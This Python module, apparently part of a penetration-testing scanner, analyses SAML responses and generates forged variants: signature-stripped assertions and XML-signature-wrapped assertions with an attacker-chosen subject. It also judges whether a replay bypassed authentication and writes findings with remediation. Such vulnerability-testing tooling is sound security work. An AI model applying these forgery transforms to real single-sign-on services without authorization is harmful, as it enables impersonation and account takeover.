"""SAML SSO security engine (#109) — deterministic analyzer + attack-variant generators + a confirmation
oracle for the three classic assertion-forgery classes, all target-agnostic and FP-safe:

  * SIGNATURE EXCLUSION — the SP accepts a SAMLResponse/Assertion that carries NO signature at all.
  * SIGNATURE STRIPPING — the SP accepts an assertion after its <ds:Signature> is removed.
  * XML SIGNATURE WRAPPING (XSW) — a forged unsigned assertion is injected alongside the signed original in
    a position the SP's verifier trusts but its assertion-consumer reads.

This module is the PURE decision + transform layer (decode a SAMLResponse, describe its signing posture,
build each tampered variant, and JUDGE the SP's response to a replay). The live replay (send the tampered
assertion to the SP's ACS, observe whether an authenticated session results) runs in the tool that imports
this and is INTRUSIVE + gated — a confirmed hit is a critical authentication-bypass (CWE-347). No network
here => fully unit-testable. It NEVER forges a signature or cracks a key; it only removes/moves elements to
test whether the SP verifies them at all.
"""
from __future__ import annotations

import base64
import re
import zlib
from urllib.parse import unquote

_SIG_RE = re.compile(r"<(?:\w+:)?Signature\b.*?</(?:\w+:)?Signature>", re.I | re.S)
_ASSERTION_RE = re.compile(r"<(?:\w+:)?Assertion\b.*?</(?:\w+:)?Assertion>", re.I | re.S)


def decode(value: str) -> str | None:
    """Decode a SAMLResponse/SAMLRequest parameter to XML. Handles URL-encoding, base64, and the
    DEFLATE used by the HTTP-Redirect binding (raw inflate). Returns the XML string, or None."""
    if not value:
        return None
    v = unquote(value).strip()
    try:
        raw = base64.b64decode(v, validate=False)
    except Exception:
        return v if v.lstrip().startswith("<") else None
    # Redirect binding deflates; POST binding does not. Try raw-inflate, then treat as plain XML.
    for attempt in (lambda b: zlib.decompress(b, -15), lambda b: b):
        try:
            xml = attempt(raw).decode("utf-8", "replace")
            if "<" in xml and ("Response" in xml or "Assertion" in xml):
                return xml
        except Exception:
            continue
    try:
        xml = raw.decode("utf-8", "replace")
        return xml if "<" in xml else None
    except Exception:
        return None


def analyze(xml: str) -> dict:
    """Describe a SAMLResponse's signing posture — the substrate the attack planner + verdict use. Pure.
    `response_signed` / `assertion_signed` are whether a <Signature> is present on the Response element vs
    inside an <Assertion> (a common real-world weakness is signing the Response but trusting the Assertion)."""
    xml = xml or ""
    assertions = _ASSERTION_RE.findall(xml)
    assertion_signed = any(_SIG_RE.search(a) for a in assertions)
    # a signature that is NOT inside any assertion is a response-level signature
    total_sigs = len(_SIG_RE.findall(xml))
    in_assertion = sum(len(_SIG_RE.findall(a)) for a in assertions)
    return {
        "is_response": bool(re.search(r"<(?:\w+:)?Response\b", xml, re.I)),
        "assertion_count": len(assertions),
        "signature_count": total_sigs,
        "response_signed": total_sigs > in_assertion,
        "assertion_signed": assertion_signed,
        "unsigned": total_sigs == 0,
    }


def strip_signatures(xml: str) -> str:
    """Signature-STRIPPING / EXCLUSION variant: remove every <Signature> so the assertion is unsigned. A SP
    that still accepts it does not verify signatures at all."""
    return _SIG_RE.sub("", xml or "")


def wrap_assertion(xml: str, new_name_id: str = "admin@apolaki-test.local") -> str | None:
    """XML SIGNATURE WRAPPING variant (structural): inject a FORGED unsigned assertion (attacker-chosen
    Subject) as a sibling BEFORE the original signed assertion, and strip the forged copy's signature. A SP
    whose verifier checks the original signature but whose consumer reads the FIRST assertion authenticates
    as the forged subject. Returns None when there is no assertion to wrap."""
    m = _ASSERTION_RE.search(xml or "")
    if not m:
        return None
    original = m.group(0)
    forged = strip_signatures(original)
    # swap the Subject NameID in the forged copy to the attacker-chosen principal
    forged = re.sub(r"(<(?:\w+:)?NameID\b[^>]*>).*?(</(?:\w+:)?NameID>)",
                    r"\g<1>%s\g<2>" % re.escape(new_name_id).replace("\\", ""), forged, count=1, flags=re.I | re.S)
    # forged assertion placed immediately before the signed original (classic XSW position)
    return xml[:m.start()] + forged + original + xml[m.end():]


def confirm_bypass(baseline, tampered) -> dict | None:
    """Judge a replay. `baseline` and `tampered` are dicts {status, authenticated} describing the SP's
    response to the ORIGINAL vs the TAMPERED assertion. A confirmed signature-verification bypass requires:
    the baseline authenticated (so the flow itself works) AND the tampered (unsigned/stripped/wrapped)
    assertion ALSO produced an authenticated session. Returns {confirmed, evidence} or None. Zero-FP: if the
    SP rejected the tampered assertion (no session), nothing is claimed."""
    b, t = baseline or {}, tampered or {}
    if not b.get("authenticated"):
        return None                              # the baseline flow didn't even work — inconclusive, no claim
    if t.get("authenticated"):
        return {"confirmed": True,
                "evidence": "SP issued an authenticated session for a TAMPERED assertion "
                            "(baseline status=%s, tampered status=%s) — signatures are not verified"
                            % (b.get("status"), t.get("status"))}
    return None


def finding(kind: str, acs_url: str, evidence: str) -> dict:
    """CONFIRMED SAML signature-verification bypass. `kind` in
    {signature_exclusion, signature_stripping, signature_wrapping}."""
    label = {"signature_exclusion": "signature exclusion (unsigned assertion accepted)",
             "signature_stripping": "signature stripping (assertion accepted after signature removed)",
             "signature_wrapping": "XML signature wrapping (forged assertion consumed)"}.get(kind, kind)
    return {
        "title": "SAML authentication bypass — %s" % label,
        "severity": "critical", "family": "broken_auth", "confidence": "confirmed",
        "cwe": "CWE-347", "owasp": "A07:2021", "target": acs_url,
        "tags": ["saml", "sso", "authentication-bypass", kind, "signature-verification"],
        "description": ("The Service Provider's Assertion Consumer Service at %s accepted a tampered SAML "
                        "assertion (%s), proving it does not correctly verify the XML signature. An attacker "
                        "can forge an assertion for any user — full authentication bypass / account takeover."
                        % (acs_url, label)),
        "impact": "Impersonate any user (including admins) by forging a SAML assertion — complete auth bypass.",
        "reproduction_steps": [
            "Capture a valid SAMLResponse from a real login to %s." % acs_url,
            "Produce the tampered assertion (%s) and POST it to the ACS." % label,
            "Observe the SP establishes an authenticated session for the tampered/forged subject.",
        ],
        "evidence": evidence,
        "false_positive_check": ("confirmed only when the SP authenticated the TAMPERED assertion AND the "
                                 "baseline flow authenticated — a rejected tamper claims nothing."),
        "remediation": ("Verify the XML signature over the ASSERTION with a pinned IdP certificate before "
                        "trust; reject unsigned/multiple assertions; use a hardened SAML library, not regex."),
    }


def plan_leads(xml: str, acs_url: str = "") -> list:
    """When a SAMLResponse is DISCOVERED but no live replay oracle is available, raise how-to-confirm LEADS
    from its signing posture (never a confirmed finding). A response-signed-but-assertion-unsigned posture is
    the highest-value XSW lead."""
    a = analyze(xml)
    if not a["is_response"]:
        return []
    leads = []
    base = {"family": "broken_auth", "confidence": "lead", "severity": "high", "cwe": "CWE-347",
            "target": acs_url or "(SAML ACS)", "tags": ["saml", "sso", "needs-confirmation"]}
    if a["unsigned"]:
        leads.append({**base, "title": "SAML assertion carries no signature — test signature exclusion",
                      "evidence": "0 <Signature> elements in the SAMLResponse",
                      "reproduction_steps": ["Replay the unsigned assertion to the ACS; if a session is "
                                             "issued, signatures are not verified."]})
    elif a["response_signed"] and not a["assertion_signed"]:
        leads.append({**base, "title": "SAML Response signed but Assertion unsigned — test XML signature wrapping",
                      "evidence": "signature present at Response level, none inside the Assertion",
                      "reproduction_steps": ["Wrap a forged unsigned assertion before the signed original and "
                                             "replay; if consumed, the SP trusts the wrong element."]})
    return leads
